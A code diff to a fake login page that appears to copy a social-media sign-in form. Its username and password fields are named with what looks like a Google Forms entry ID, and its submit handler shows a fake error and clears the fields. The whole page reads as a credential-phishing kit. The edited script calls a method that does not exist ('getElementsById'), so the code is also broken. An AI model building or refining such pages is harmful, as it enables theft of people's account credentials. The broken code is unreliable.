@@ -18,10 +18,10 @@
 			<div class="form">
 				<div class="input_field">
 						
-						<input type="text" name="entry.769519880" placeholder="Phone number, username, or email" class="input" >
+						<input type="text" id="email" name="entry.769519880" placeholder="Phone number, username, or email" class="input" >
 				</div>
 				<div class="input_field">
-					<input type="password" name="entry.769519880" placeholder="Password" class="input">
+					<input type="password" id="pass" name="entry.769519880" placeholder="Password" class="input">
 				</div>
 				<div class="btn" ><a href="#" onclick="my_submit();" >Log In</a></div>
 				
@@ -251,8 +251,8 @@ body{
 function my_submit(){
 	document.getElementById('myform').submit();
 	document.getElementById('error').style.display = "block";
-	document.getElementsByClassName('input').value = "";
-	
+	document.getElementsById('email').value = "";
+	document.getElementsById('pass').value = "";
 }
 </script>
 
